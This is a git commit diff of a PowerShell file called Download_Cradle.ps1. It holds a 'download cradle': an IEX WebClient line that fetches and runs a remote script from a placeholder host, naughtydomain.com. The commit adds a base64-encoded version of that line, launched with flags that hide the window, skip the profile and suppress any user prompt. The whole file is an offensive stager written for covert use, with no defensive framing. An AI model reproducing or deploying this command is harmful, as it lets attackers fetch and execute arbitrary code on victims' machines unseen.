1a91d85de870ee6809658c06701aacd0593eb28d
Monte Carlito <38365402+montecarlito@users.noreply.github.com>
2021-05-12 23:20:41 +0000

    Update Download_Cradle.ps1

--- Download_Cradle.ps1
+++ Download_Cradle.ps1
@@ -1,1 +1,4 @@
 IEX (New-Object System.Net.WebClient).downloadstring('http://naughtydomain.com/a')
+#
+#To run in a hidden window, without loading a PS profile, and without an interactive prompt to the user:
+powershell -W Hidden -nop -noni -ec ("SUVYIChOZXctT2JqZWN0IFN5c3RlbS5OZXQuV2ViQ2xpZW50KS5kb3dubG9hZHN0cmluZygnaHR0cDovL25hdWdodHlkb21haW4uY29tL2EnKQ==")
